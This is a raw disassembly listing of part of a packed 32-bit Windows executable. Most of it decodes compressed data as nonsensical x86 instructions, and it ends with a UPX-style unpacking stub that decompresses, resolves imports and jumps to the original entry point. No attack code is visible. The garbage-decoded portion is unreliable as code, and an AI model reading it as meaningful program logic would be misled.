  409768:	e1 1d                	loope  0x409787
  40976a:	5c                   	pop    %esp
  40976b:	fb                   	sti
  40976c:	65 6d                	gs insl (%dx),%es:(%edi)
  40976e:	61                   	popa
  40976f:	70 68                	jo     0x4097d9
  409771:	21 ad 35 c6 c1 98    	and    %ebp,-0x673e39cb(%ebp)
  409777:	9b                   	fwait
  409778:	84 53 5c             	test   %dl,0x5c(%ebx)
  40977b:	a9 0a 87 00 61       	test   $0x6100870a,%eax
  409780:	97                   	xchg   %eax,%edi
  409781:	70 11                	jo     0x409794
  409783:	0d 47 3a f4 a1       	or     $0xa1f43a47,%eax
  409788:	c1 8c b3 9e 20 8d a7 	rorl   $0x14,-0x5872df62(%ebx,%esi,4)
  40978f:	14 
  409790:	50                   	push   %eax
  409791:	d8 04 c7             	fadds  (%edi,%eax,8)
  409794:	61                   	popa
  409795:	83 2e 0a             	subl   $0xa,(%esi)
  409798:	ac                   	lods   %ds:(%esi),%al
  409799:	19 ba 5e 4e 91 fb    	sbb    %edi,-0x46eb1a2(%edx)
  40979f:	32 06                	xor    (%esi),%al
  4097a1:	59                   	pop    %ecx
  4097a2:	80 e4 73             	and    $0x73,%ah
  4097a5:	c5 00                	lds    (%eax),%eax
  4097a7:	0b 84 3d f7 c5 2e d8 	or     -0x27d13a09(%ebp,%edi,1),%eax
  4097ae:	6c                   	insb   (%dx),%es:(%edi)
  4097af:	55                   	push   %ebp
  4097b0:	d8 5e f1             	fcomps -0xf(%esi)
  4097b3:	61                   	popa
  4097b4:	15 60 b3 41 31       	adc    $0x3141b360,%eax
  4097b9:	64 63 56 20          	arpl   %edx,%fs:0x20(%esi)
  4097bd:	63 1e                	arpl   %ebx,(%esi)
  4097bf:	fc                   	cld
  4097c0:	50                   	push   %eax
  4097c1:	bc 04 36 08 31       	mov    $0x31083604,%esp
  4097c6:	64 61                	fs popa
  4097c8:	13 06                	adc    (%esi),%eax
  4097ca:	90                   	nop
  4097cb:	61                   	popa
  4097cc:	67 40                	addr16 inc %eax
  4097ce:	81 cd 42 34 6a 24    	or     $0x246a3442,%ebp
  4097d4:	b4 8b                	mov    $0x8b,%ah
  4097d6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4097d7:	be 46 be 44 92       	mov    $0x9244be46,%esi
  4097dc:	17                   	pop    %ss
  4097dd:	ca 16 3b             	lret   $0x3b16
  4097e0:	78 8a                	js     0x40976c
  4097e2:	6c                   	insb   (%dx),%es:(%edi)
  4097e3:	c2 88 92             	ret    $0x9288
  4097e6:	7b 91                	jnp    0x409779
  4097e8:	a2 b0 59 3e 7e       	mov    %al,0x7e3e59b0
  4097ed:	58                   	pop    %eax
  4097ee:	08 7c 61 53          	or     %bh,0x53(%ecx,%eiz,2)
  4097f2:	54                   	push   %esp
  4097f3:	61                   	popa
  4097f4:	6b 39 b2             	imul   $0xffffffb2,(%ecx),%edi
  4097f7:	14 b6                	adc    $0xb6,%al
  4097f9:	b2 96                	mov    $0x96,%dl
  4097fb:	24 46                	and    $0x46,%al
  4097fd:	36 6a 97             	ss push $0xffffff97
  409800:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  409803:	06                   	push   %es
  409804:	49                   	dec    %ecx
  409805:	6e                   	outsb  %ds:(%esi),(%dx)
  409806:	f1                   	int1
  409807:	3a 2a                	cmp    (%edx),%ch
  409809:	61                   	popa
  40980a:	e1 4b                	loope  0x409857
  40980c:	2e 00 46 37          	add    %al,%cs:0x37(%esi)
  409810:	3c 65                	cmp    $0x65,%al
  409812:	cd 45                	int    $0x45
  409814:	72 72                	jb     0x409888
  409816:	76 43                	jbe    0x40985b
  409818:	6f                   	outsl  %ds:(%esi),(%dx)
  409819:	64 3e 81 10 60 31 0a 	fs adcl $0xdd0a3160,%ds:(%eax)
  409820:	dd 
  409821:	31 18                	xor    %ebx,(%eax)
  409823:	fb                   	sti
  409824:	c8 05 57 f5          	enter  $0x5705,$0xf5
  409828:	74 86                	je     0x4097b0
  40982a:	25 5e db be 9f       	and    $0x9fbedb5e,%eax
  40982f:	f0 75 72             	lock jne 0x4098a4
  409832:	73 08                	jae    0x40983c
  409834:	4d                   	dec    %ebp
  409835:	b6 75                	mov    $0x75,%dh
  409837:	15 0a d8 5a 89       	adc    $0x895ad80a,%eax
  40983c:	26 6d                	es insl (%dx),%es:(%edi)
  40983e:	63 e8                	arpl   %ebp,%eax
  409840:	ac                   	lods   %ds:(%esi),%al
  409841:	98                   	cwtl
  409842:	46                   	inc    %esi
  409843:	26 bc 78 bc 4e 00    	es mov $0x4ebc78,%esp
  409849:	dd 0a                	fisttpll (%edx)
  40984b:	87 64 29 c0          	xchg   %esp,-0x40(%ecx,%ebp,1)
  40984f:	48                   	dec    %eax
  409850:	92                   	xchg   %eax,%edx
  409851:	3e 58                	ds pop %eax
  409853:	2c 42                	sub    $0x42,%al
  409855:	64 4d                	fs dec %ebp
  409857:	ad                   	lods   %ds:(%esi),%eax
  409858:	47                   	inc    %edi
  409859:	83 22 61             	andl   $0x61,(%edx)
  40985c:	04 23                	add    $0x23,%al
  40985e:	21 34 05 08 6c 0d 66 	and    %esi,0x660d6c08(,%eax,1)
  409865:	0f 07                	sysret
  409867:	b8 00 53 34 15       	mov    $0x15345300,%eax
  40986c:	1a 7d 23             	sbb    0x23(%ebp),%bh
  40986f:	18 b6 fd 56 31 2e    	sbb    %dh,0x2e3156fd(%esi)
  409875:	32 cd                	xor    %ch,%cl
  409877:	d0 d2                	rcl    $1,%dl
  409879:	b7 8d                	mov    $0x8d,%bh
  40987b:	b7 57                	mov    $0x57,%bh
  40987d:	91                   	xchg   %eax,%ecx
  40987e:	45                   	inc    %ebp
  40987f:	67 67 44             	addr16 addr16 inc %esp
  409882:	10 70 36             	adc    %dh,0x36(%eax)
  409885:	03 9e c0 e0 44 00    	add    0x44e0c0(%esi),%ebx
  40988b:	d9 07                	flds   (%edi)
  40988d:	c0 64 74 d8 48       	shlb   $0x48,-0x28(%esp,%esi,2)
  409892:	08 54 44 74          	or     %dl,0x74(%esp,%eax,2)
  409896:	d0 51 f7             	rclb   $1,-0x9(%ecx)
  409899:	2a 73 c5             	sub    -0x3b(%ebx),%dh
  40989c:	0d 75 2b 31 6b       	or     $0x6b312b75,%eax
  4098a1:	b5 9b                	mov    $0x9b,%ch
  4098a3:	3b 1e                	cmp    (%esi),%ebx
  4098a5:	05 ef 75 6c 1c       	add    $0x1c6c75ef,%eax
  4098aa:	ae                   	scas   %es:(%edi),%al
  4098ab:	5f                   	pop    %edi
  4098ac:	6d                   	insl   (%dx),%es:(%edi)
  4098ad:	1b b6 9a f5 c7 70    	sbb    0x70c7f59a(%esi),%esi
  4098b3:	00 6e 74             	add    %ch,0x74(%esi)
  4098b6:	53                   	push   %ebx
  4098b7:	6c                   	insb   (%dx),%es:(%edi)
  4098b8:	8c 28                	mov    %gs,(%eax)
  4098ba:	c1 ad d3 41 64 6c 25 	shrl   $0x25,0x6c6441d3(%ebp)
  4098c1:	9e                   	sahf
  4098c2:	01 61 a1             	add    %esp,-0x5f(%ecx)
  4098c5:	aa                   	stos   %al,%es:(%edi)
  4098c6:	03 a8 00 90 40 a3    	add    -0x5cbf7000(%eax),%ebp
  4098cc:	fe                   	(bad)
  4098cd:	b2 b9                	mov    $0xb9,%dl
  4098cf:	b9 28 61 01 51       	mov    $0x51016128,%ecx
  4098d4:	75 65                	jne    0x40993b
  4098d6:	72 79                	jb     0x409951
  4098d8:	85 5b bb             	test   %ebx,-0x45(%ebx)
  4098db:	04 3f                	add    $0x3f,%al
  4098dd:	61                   	popa
  4098de:	6e                   	outsb  %ds:(%esi),(%dx)
  4098df:	63 65 92             	arpl   %esp,-0x6e(%ebp)
  4098e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4098e3:	74 0e                	je     0x4098f3
  4098e5:	18 47 08             	sbb    %al,0x8(%edi)
  4098e8:	d5 fe                	aad    $0xfe
  4098ea:	ed                   	in     (%dx),%eax
  4098eb:	65 74 56             	gs je  0x409944
  4098ee:	07                   	pop    %es
  4098ef:	73 69                	jae    0x40995a
  4098f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4098f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4098f3:	45                   	inc    %ebp
  4098f4:	78 41                	js     0x409937
  4098f6:	0e                   	push   %cs
  4098f7:	f0 fb                	lock sti
  4098f9:	2b 81 fb 46 69 6c    	sub    0x6c6946fb(%ecx),%eax
  4098ff:	65 0c ad             	gs or  $0xad,%al
  409902:	09 50 6f             	or     %edx,0x6f(%eax)
  409905:	69 2b 9b dd 6d 3f    	imul   $0x3f6ddd9b,(%ebx),%ebp
  40990b:	6c                   	insb   (%dx),%es:(%edi)
  40990c:	73 74                	jae    0x409982
  40990e:	72 0e                	jb     0x40991e
  409910:	6e                   	outsb  %ds:(%esi),(%dx)
  409911:	19 57 72             	sbb    %edx,0x72(%edi)
  409914:	69 25 31 7e 2c 12 bc 	imul   $0x736f6cbc,0x122c7e31,%esp
  40991b:	6c 6f 73 
  40991e:	65 c8 4d 4c 6f       	gs enter $0x4c4d,$0x6f
  409923:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  409926:	75 df                	jne    0x409907
  409928:	66 00 7c 0d 45       	data16 add %bh,0x45(%ebp,%ecx,1)
  40992d:	36 43                	ss inc %ebx
  40992f:	2a 69 e0             	sub    -0x20(%ecx),%ch
  409932:	e6 b6                	out    %al,$0xb6
  409934:	c0 12 d1             	rclb   $0xd1,(%edx)
  409937:	74 65                	je     0x40999e
  409939:	15 4c 65 b5 ed       	adc    $0xedb5654c,%eax
  40993e:	94                   	xchg   %eax,%esp
  40993f:	b5 46                	mov    $0x46,%ch
  409941:	15 52 65 3f 61       	adc    $0x613f6552,%eax
  409946:	48                   	dec    %eax
  409947:	b3 9b                	mov    $0x9b,%bl
  409949:	1b 46 69             	sbb    0x69(%esi),%eax
  40994c:	7d 10                	jge    0x40995e
  40994e:	65 70 74             	gs jo  0x4099c5
  409951:	fb                   	sti
  409952:	b0 60                	mov    $0x60,%al
  409954:	ef                   	out    %eax,(%dx)
  409955:	63 70 79             	arpl   %esi,0x79(%eax)
  409958:	75 0a                	jne    0x409964
  40995a:	09 6d 70             	or     %ebp,0x70(%ebp)
  40995d:	69 b1 dd 62 93 25 37 	imul   $0x7f844137,0x259362dd(%ecx),%esi
  409964:	41 84 7f 
  409967:	63 6b 2e             	arpl   %ebp,0x2e(%ebx)
  40996a:	56                   	push   %esi
  40996b:	0c 8b                	or     $0x8b,%al
  40996d:	e2 1f                	loop   0x40998e
  40996f:	00 b8 6b c5 02 95    	add    %bh,-0x6afd3a95(%eax)
  409975:	61                   	popa
  409976:	55                   	push   %ebp
  409977:	53                   	push   %ebx
  409978:	24 5e                	and    $0x5e,%al
  40997a:	51                   	push   %ecx
  40997b:	8a 99 7b 4f 62 6a    	mov    0x6a624f7b(%ecx),%bl
  409981:	7e b5                	jle    0x409938
  409983:	b6 ed                	mov    $0xed,%dh
  409985:	16                   	push   %ss
  409986:	c4 4e f8             	les    -0x8(%esi),%ecx
  409989:	f5                   	cmc
  40998a:	9f                   	lahf
  40998b:	73 6f                	jae    0x4099fc
  40998d:	1f                   	pop    %ds
  40998e:	74 95                	je     0x409925
  409990:	9b                   	fwait
  409991:	b9 43 ee d9 16       	mov    $0x16d9ee43,%ecx
  409996:	19 69 b6             	sbb    %ebp,-0x4a(%ecx)
  409999:	1d d9 16 e5 7a       	sbb    $0x7ae516d9,%eax
  40999e:	bb 41 20 53 89       	mov    $0x89532041,%ebx
  4099a3:	18 59 37             	sbb    %bl,0x37(%ecx)
  4099a6:	d8 6e 6e             	fsubrs 0x6e(%esi)
  4099a9:	44                   	inc    %esp
  4099aa:	c7                   	(bad)
  4099ab:	74 22                	je     0x4099cf
  4099ad:	56                   	push   %esi
  4099ae:	1c bb                	sbb    $0xbb,%al
  4099b0:	59                   	pop    %ecx
  4099b1:	88 ac 48 62 00 6b 42 	mov    %ch,0x426b0062(%eax,%ecx,2)
  4099b8:	65 22 fb             	gs and %bl,%bh
  4099bb:	3f                   	aas
  4099bc:	e1 87                	loope  0x409945
  4099be:	1a 66 61             	sbb    0x61(%esi),%ah
  4099c1:	63 33                	arpl   %esi,(%ebx)
  4099c3:	49                   	dec    %ecx
  4099c4:	70 41                	jo     0x409a07
  4099c6:	64 64 72 54          	fs fs jb 0x409a1e
  4099ca:	61                   	popa
  4099cb:	62 3b                	bound  %edi,(%ebx)
  4099cd:	1a 3e                	sbb    (%esi),%bh
  4099cf:	cd 42                	int    $0x42
  4099d1:	b3 c6                	mov    $0xc6,%bl
  4099d3:	88 70 72             	mov    %dh,0x72(%eax)
  4099d6:	77 66                	ja     0x409a3e
  4099d8:	ba b6 39 d7 07       	mov    $0x7d739b6,%edx
  4099dd:	eb 02                	jmp    0x4099e1
  4099df:	07                   	pop    %es
  4099e0:	66 c2 2e 6d          	retw   $0x6d2e
  4099e4:	73 86                	jae    0x40996c
  4099e6:	58                   	pop    %eax
  4099e7:	db e9                	fucomi %st(1),%st
  4099e9:	73 31                	jae    0x409a1c
  4099eb:	07                   	pop    %es
  4099ec:	0b 07                	or     (%edi),%eax
  4099ee:	65 b4 f2             	gs mov $0xf2,%ah
  4099f1:	d8 42 81             	fadds  -0x7f(%edx)
  4099f4:	63 25 74 6f 6b ec    	arpl   %esp,0xec6b6f74
  4099fa:	6b 2f 16             	imul   $0x16,(%edi),%ebp
  4099fd:	2b ae 0d 1d 07 fa    	sub    -0x5f8e2f3(%esi),%ebp
  409a03:	2d 19 9a eb 1e       	sub    $0x1eeb9a19,%eax
  409a08:	6d                   	insl   (%dx),%es:(%edi)
  409a09:	6f                   	outsl  %ds:(%esi),(%dx)
  409a0a:	76 3e                	jbe    0x409a4a
  409a0c:	5f                   	pop    %edi
  409a0d:	11 c9                	adc    %ecx,%ecx
  409a0f:	3b f1                	cmp    %ecx,%esi
  409a11:	fd                   	std
  409a12:	42                   	inc    %edx
  409a13:	d7                   	xlat   %ds:(%ebx)
  409a14:	0a 5f 48             	or     0x48(%edi),%bl
  409a17:	5f                   	pop    %edi
  409a18:	36 70 5f             	ss jo  0x409a7a
  409a1b:	74 79                	je     0x409a96
  409a1d:	70 1a                	jo     0x409a39
  409a1f:	63 06                	arpl   %eax,(%esi)
  409a21:	fb                   	sti
  409a22:	d8 08                	fmuls  (%eax)
  409a24:	96                   	xchg   %eax,%esi
  409a25:	66 1b 61 72          	sbb    0x72(%ecx),%sp
  409a29:	67 63 07             	arpl   %eax,(%bx)
  409a2c:	76 7c                	jbe    0x409aaa
  409a2e:	ad                   	lods   %ds:(%esi),%eax
  409a2f:	ba 60 f6 76 69       	mov    $0x6976f660,%edx
  409a34:	7f 35                	jg     0x409a6b
  409a36:	67 da a5 6b ad       	fisubl -0x5295(%di)
  409a3b:	74 9a                	je     0x4099d7
  409a3d:	18 73 65             	sbb    %dh,0x65(%ebx)
  409a40:	78 e9                	js     0x409a2b
  409a42:	ef                   	out    %eax,(%dx)
  409a43:	b9 47 eb 14 58       	mov    $0x5814eb47,%ecx
  409a48:	6d                   	insl   (%dx),%es:(%edi)
  409a49:	2b d4                	sub    %esp,%edx
  409a4b:	2b 13                	sub    (%ebx),%edx
  409a4d:	e1 84                	loope  0x4099d3
  409a4f:	5b                   	pop    %ebx
  409a50:	7b 06                	jnp    0x409a58
  409a52:	de 15 5f 68 41 33    	ficoms 0x3341685f
  409a58:	04 6c                	add    $0x6c,%al
  409a5a:	67 9f                	addr16 lahf
  409a5c:	66 d1 40 77          	rolw   $1,0x77(%eax)
  409a60:	73 db                	jae    0x409a3d
  409a62:	41                   	inc    %ecx
  409a63:	ed                   	in     (%dx),%eax
  409a64:	dc dc                	(bad)
  409a66:	47                   	inc    %edi
  409a67:	f0 d3 e4             	lock shl %cl,%esp
  409a6a:	57                   	push   %edi
  409a6b:	53                   	push   %ebx
  409a6c:	41                   	inc    %ecx
  409a6d:	65 75 7d             	gs jne 0x409aed
  409a70:	ce                   	into
  409a71:	1d be d6 97 32       	sbb    $0x3297d6be,%eax
  409a76:	05 6c 9e 71 1b       	add    $0x1b719e6c,%eax
  409a7b:	00 74 ed fb          	add    %dh,-0x5(%ebp,%ebp,8)
  409a7f:	46                   	inc    %esi
  409a80:	44                   	inc    %esp
  409a81:	49                   	dec    %ecx
  409a82:	73 53                	jae    0x409ad7
  409a84:	f7 72 13             	divl   0x13(%edx)
  409a87:	8f                   	(bad)
  409a88:	73 e0                	jae    0x409a6a
  409a8a:	66 97                	xchg   %ax,%di
  409a8c:	ed                   	in     (%dx),%eax
  409a8d:	a2 ed 68 6e 6c       	mov    %al,0x6c6e68ed
  409a92:	06                   	push   %es
  409a93:	8c 7b dd             	mov    %?,-0x23(%ebx)
  409a96:	b0 ad                	mov    $0xad,%al
  409a98:	6a 2f                	push   $0x2f
  409a9a:	6c                   	insb   (%dx),%es:(%edi)
  409a9b:	1a cd                	sbb    %ch,%cl
  409a9d:	6e                   	outsb  %ds:(%esi),(%dx)
  409a9e:	3f                   	aas
  409a9f:	59                   	pop    %ecx
  409aa0:	c3                   	ret
  409aa1:	1e                   	push   %ds
  409aa2:	17                   	pop    %ss
  409aa3:	c2 e1 63             	ret    $0x63e1
  409aa6:	b2 26                	mov    $0x26,%dl
  409aa8:	b5 59                	mov    $0x59,%ch
  409aaa:	fb                   	sti
  409aab:	0c 03                	or     $0x3,%al
  409aad:	0a 6f a9             	or     -0x57(%edi),%ch
  409ab0:	77 49                	ja     0x409afb
  409ab2:	55                   	push   %ebp
  409ab3:	dd ec                	fucomp %st(4)
  409ab5:	ad                   	lods   %ds:(%esi),%eax
  409ab6:	07                   	pop    %es
  409ab7:	9a 6f 68 6c 06 55 62 	lcall  $0x6255,$0x66c686f
  409abe:	38 74 6f ac          	cmp    %dh,-0x54(%edi,%ebp,2)
  409ac2:	f2 45                	repnz inc %ebp
  409ac4:	49                   	dec    %ecx
  409ac5:	5e                   	pop    %esi
  409ac6:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ac8:	36 d8 1a             	fcomps %ss:(%edx)
  409acb:	86 66 b0             	xchg   %ah,-0x50(%esi)
  409ace:	0a 0a                	or     (%edx),%cl
  409ad0:	74 57                	je     0x409b29
  409ad2:	62 b1 2e f6 d8 9e    	bound  %esi,-0x612709d2(%ecx)
  409ad8:	61                   	popa
  409ad9:	f0 19 35 61 2e e5 48 	lock sbb %esi,0x48e52e61
  409ae0:	b9 8e 43 d1 6e       	mov    $0x6ed1438e,%ecx
  409ae5:	ce                   	into
  409ae6:	ce                   	into
  409ae7:	50                   	push   %eax
  409ae8:	45                   	inc    %ebp
  409ae9:	60                   	pusha
  409aea:	f9                   	stc
  409aeb:	27                   	daa
  409aec:	e4 4c                	in     $0x4c,%al
  409aee:	01 02                	add    %eax,(%edx)
  409af0:	e0 00                	loopne 0x409af2
  409af2:	0f 03 0b             	lsl    (%ebx),%ecx
  409af5:	01 06                	add    %eax,(%esi)
  409af7:	42                   	inc    %edx
  409af8:	eb cc                	jmp    0x409ac6
  409afa:	91                   	xchg   %eax,%ecx
  409afb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409afc:	aa                   	stos   %al,%es:(%edi)
  409afd:	18 ec                	sbb    %ch,%ah
  409aff:	4c                   	dec    %esp
  409b00:	03 60 0d             	add    0xd(%eax),%esp
  409b03:	c3                   	ret
  409b04:	26 dd ec             	es fucomp %st(4)
  409b07:	40                   	inc    %eax
  409b08:	0b 36                	or     (%esi),%esi
  409b0a:	04 07                	add    $0x7,%al
  409b0c:	6b 50 9f 6c          	imul   $0x6c,-0x61(%eax),%edx
  409b10:	17                   	pop    %ss
  409b11:	80 e9 45             	sub    $0x45,%cl
  409b14:	01 34 2b             	add    %esi,(%ebx,%ebp,1)
  409b17:	56                   	push   %esi
  409b18:	2f                   	das
  409b19:	d9 e4                	ftst
  409b1b:	10 07                	adc    %al,(%edi)
  409b1d:	06                   	push   %es
  409b1e:	4c                   	dec    %esp
  409b1f:	07                   	pop    %es
  409b20:	08 59 5e             	or     %bl,0x5e(%ecx)
  409b23:	b0 70                	mov    $0x70,%al
  409b25:	78 28                	js     0x409b4f
  409b27:	71 dd                	jno    0x409b06
  409b29:	b8 42 6e 1f 2c       	mov    $0x2c1f6e42,%eax
  409b2e:	01 2e                	add    %ebp,(%esi)
  409b30:	12 78 74             	adc    0x74(%eax),%bh
  409b33:	17                   	pop    %ss
  409b34:	f6 05 db 07 b8 40 90 	testb  $0x90,0x40b807db
  409b3b:	eb 02                	jmp    0x409b3f
  409b3d:	23 20                	and    (%eax),%esp
  409b3f:	72 2b                	jb     0x409b6c
  409b41:	34 76                	xor    $0x76,%al
  409b43:	ed                   	in     (%dx),%eax
  409b44:	2e 64 b8 36 fb cc 17 	cs fs mov $0x17ccfb36,%eax
  409b4b:	ed                   	in     (%dx),%eax
  409b4c:	16                   	push   %ss
  409b4d:	d2 0d 18 27 44 42    	rorb   %cl,0x42442718
  409b53:	c0 00 00             	rolb   $0x0,(%eax)
  409b56:	00 66 db             	add    %ah,-0x25(%esi)
  409b59:	c7 80 73 03 8a 04 00 	movl   $0x0,0x48a0373(%eax)
  409b60:	00 00 00 
  409b63:	00 00                	add    %al,(%eax)
  409b65:	80 ff 00             	cmp    $0x0,%bh
	...
  409b70:	60                   	pusha
  409b71:	be 15 80 40 00       	mov    $0x408015,%esi
  409b76:	8d be eb 8f ff ff    	lea    -0x7015(%esi),%edi
  409b7c:	57                   	push   %edi
  409b7d:	83 cd ff             	or     $0xffffffff,%ebp
  409b80:	eb 10                	jmp    0x409b92
  409b82:	90                   	nop
  409b83:	90                   	nop
  409b84:	90                   	nop
  409b85:	90                   	nop
  409b86:	90                   	nop
  409b87:	90                   	nop
  409b88:	8a 06                	mov    (%esi),%al
  409b8a:	46                   	inc    %esi
  409b8b:	88 07                	mov    %al,(%edi)
  409b8d:	47                   	inc    %edi
  409b8e:	01 db                	add    %ebx,%ebx
  409b90:	75 07                	jne    0x409b99
  409b92:	8b 1e                	mov    (%esi),%ebx
  409b94:	83 ee fc             	sub    $0xfffffffc,%esi
  409b97:	11 db                	adc    %ebx,%ebx
  409b99:	72 ed                	jb     0x409b88
  409b9b:	b8 01 00 00 00       	mov    $0x1,%eax
  409ba0:	01 db                	add    %ebx,%ebx
  409ba2:	75 07                	jne    0x409bab
  409ba4:	8b 1e                	mov    (%esi),%ebx
  409ba6:	83 ee fc             	sub    $0xfffffffc,%esi
  409ba9:	11 db                	adc    %ebx,%ebx
  409bab:	11 c0                	adc    %eax,%eax
  409bad:	01 db                	add    %ebx,%ebx
  409baf:	73 ef                	jae    0x409ba0
  409bb1:	75 09                	jne    0x409bbc
  409bb3:	8b 1e                	mov    (%esi),%ebx
  409bb5:	83 ee fc             	sub    $0xfffffffc,%esi
  409bb8:	11 db                	adc    %ebx,%ebx
  409bba:	73 e4                	jae    0x409ba0
  409bbc:	31 c9                	xor    %ecx,%ecx
  409bbe:	83 e8 03             	sub    $0x3,%eax
  409bc1:	72 0d                	jb     0x409bd0
  409bc3:	c1 e0 08             	shl    $0x8,%eax
  409bc6:	8a 06                	mov    (%esi),%al
  409bc8:	46                   	inc    %esi
  409bc9:	83 f0 ff             	xor    $0xffffffff,%eax
  409bcc:	74 74                	je     0x409c42
  409bce:	89 c5                	mov    %eax,%ebp
  409bd0:	01 db                	add    %ebx,%ebx
  409bd2:	75 07                	jne    0x409bdb
  409bd4:	8b 1e                	mov    (%esi),%ebx
  409bd6:	83 ee fc             	sub    $0xfffffffc,%esi
  409bd9:	11 db                	adc    %ebx,%ebx
  409bdb:	11 c9                	adc    %ecx,%ecx
  409bdd:	01 db                	add    %ebx,%ebx
  409bdf:	75 07                	jne    0x409be8
  409be1:	8b 1e                	mov    (%esi),%ebx
  409be3:	83 ee fc             	sub    $0xfffffffc,%esi
  409be6:	11 db                	adc    %ebx,%ebx
  409be8:	11 c9                	adc    %ecx,%ecx
  409bea:	75 20                	jne    0x409c0c
  409bec:	41                   	inc    %ecx
  409bed:	01 db                	add    %ebx,%ebx
  409bef:	75 07                	jne    0x409bf8
  409bf1:	8b 1e                	mov    (%esi),%ebx
  409bf3:	83 ee fc             	sub    $0xfffffffc,%esi
  409bf6:	11 db                	adc    %ebx,%ebx
  409bf8:	11 c9                	adc    %ecx,%ecx
  409bfa:	01 db                	add    %ebx,%ebx
  409bfc:	73 ef                	jae    0x409bed
  409bfe:	75 09                	jne    0x409c09
  409c00:	8b 1e                	mov    (%esi),%ebx
  409c02:	83 ee fc             	sub    $0xfffffffc,%esi
  409c05:	11 db                	adc    %ebx,%ebx
  409c07:	73 e4                	jae    0x409bed
  409c09:	83 c1 02             	add    $0x2,%ecx
  409c0c:	81 fd 00 f3 ff ff    	cmp    $0xfffff300,%ebp
  409c12:	83 d1 01             	adc    $0x1,%ecx
  409c15:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
  409c18:	83 fd fc             	cmp    $0xfffffffc,%ebp
  409c1b:	76 0f                	jbe    0x409c2c
  409c1d:	8a 02                	mov    (%edx),%al
  409c1f:	42                   	inc    %edx
  409c20:	88 07                	mov    %al,(%edi)
  409c22:	47                   	inc    %edi
  409c23:	49                   	dec    %ecx
  409c24:	75 f7                	jne    0x409c1d
  409c26:	e9 63 ff ff ff       	jmp    0x409b8e
  409c2b:	90                   	nop
  409c2c:	8b 02                	mov    (%edx),%eax
  409c2e:	83 c2 04             	add    $0x4,%edx
  409c31:	89 07                	mov    %eax,(%edi)
  409c33:	83 c7 04             	add    $0x4,%edi
  409c36:	83 e9 04             	sub    $0x4,%ecx
  409c39:	77 f1                	ja     0x409c2c
  409c3b:	01 cf                	add    %ecx,%edi
  409c3d:	e9 4c ff ff ff       	jmp    0x409b8e
  409c42:	5e                   	pop    %esi
  409c43:	89 f7                	mov    %esi,%edi
  409c45:	b9 f4 01 00 00       	mov    $0x1f4,%ecx
  409c4a:	8a 07                	mov    (%edi),%al
  409c4c:	47                   	inc    %edi
  409c4d:	2c e8                	sub    $0xe8,%al
  409c4f:	3c 01                	cmp    $0x1,%al
  409c51:	77 f7                	ja     0x409c4a
  409c53:	80 3f 04             	cmpb   $0x4,(%edi)
  409c56:	75 f2                	jne    0x409c4a
  409c58:	8b 07                	mov    (%edi),%eax
  409c5a:	8a 5f 04             	mov    0x4(%edi),%bl
  409c5d:	66 c1 e8 08          	shr    $0x8,%ax
  409c61:	c1 c0 10             	rol    $0x10,%eax
  409c64:	86 c4                	xchg   %al,%ah
  409c66:	29 f8                	sub    %edi,%eax
  409c68:	80 eb e8             	sub    $0xe8,%bl
  409c6b:	01 f0                	add    %esi,%eax
  409c6d:	89 07                	mov    %eax,(%edi)
  409c6f:	83 c7 05             	add    $0x5,%edi
  409c72:	88 d8                	mov    %bl,%al
  409c74:	e2 d9                	loop   0x409c4f
  409c76:	8d be 00 70 00 00    	lea    0x7000(%esi),%edi
  409c7c:	8b 07                	mov    (%edi),%eax
  409c7e:	09 c0                	or     %eax,%eax
  409c80:	74 3c                	je     0x409cbe
  409c82:	8b 5f 04             	mov    0x4(%edi),%ebx
  409c85:	8d 84 30 00 90 00 00 	lea    0x9000(%eax,%esi,1),%eax
  409c8c:	01 f3                	add    %esi,%ebx
  409c8e:	50                   	push   %eax
  409c8f:	83 c7 08             	add    $0x8,%edi
  409c92:	ff 96 80 90 00 00    	call   *0x9080(%esi)
  409c98:	95                   	xchg   %eax,%ebp
  409c99:	8a 07                	mov    (%edi),%al
  409c9b:	47                   	inc    %edi
  409c9c:	08 c0                	or     %al,%al
  409c9e:	74 dc                	je     0x409c7c
  409ca0:	89 f9                	mov    %edi,%ecx
  409ca2:	57                   	push   %edi
  409ca3:	48                   	dec    %eax
  409ca4:	f2 ae                	repnz scas %es:(%edi),%al
  409ca6:	55                   	push   %ebp
  409ca7:	ff 96 88 90 00 00    	call   *0x9088(%esi)
  409cad:	09 c0                	or     %eax,%eax
  409caf:	74 07                	je     0x409cb8
  409cb1:	89 03                	mov    %eax,(%ebx)
  409cb3:	83 c3 04             	add    $0x4,%ebx
  409cb6:	eb e1                	jmp    0x409c99
  409cb8:	ff 96 84 90 00 00    	call   *0x9084(%esi)
  409cbe:	8b ae 8c 90 00 00    	mov    0x908c(%esi),%ebp
  409cc4:	8d be 00 f0 ff ff    	lea    -0x1000(%esi),%edi
  409cca:	bb 00 10 00 00       	mov    $0x1000,%ebx
  409ccf:	50                   	push   %eax
  409cd0:	54                   	push   %esp
  409cd1:	6a 04                	push   $0x4
  409cd3:	53                   	push   %ebx
  409cd4:	57                   	push   %edi
  409cd5:	ff d5                	call   *%ebp
  409cd7:	8d 87 9f 01 00 00    	lea    0x19f(%edi),%eax
  409cdd:	80 20 7f             	andb   $0x7f,(%eax)
  409ce0:	80 60 28 7f          	andb   $0x7f,0x28(%eax)
  409ce4:	58                   	pop    %eax
  409ce5:	50                   	push   %eax
  409ce6:	54                   	push   %esp
  409ce7:	50                   	push   %eax
  409ce8:	53                   	push   %ebx
  409ce9:	57                   	push   %edi
  409cea:	ff d5                	call   *%ebp
  409cec:	58                   	pop    %eax
  409ced:	61                   	popa
  409cee:	8d 44 24 80          	lea    -0x80(%esp),%eax
  409cf2:	6a 00                	push   $0x0
  409cf4:	39 c4                	cmp    %eax,%esp
  409cf6:	75 fa                	jne    0x409cf2
  409cf8:	83 ec 80             	sub    $0xffffff80,%esp
  409cfb:	e9 ec af ff ff       	jmp    0x404cec
	...
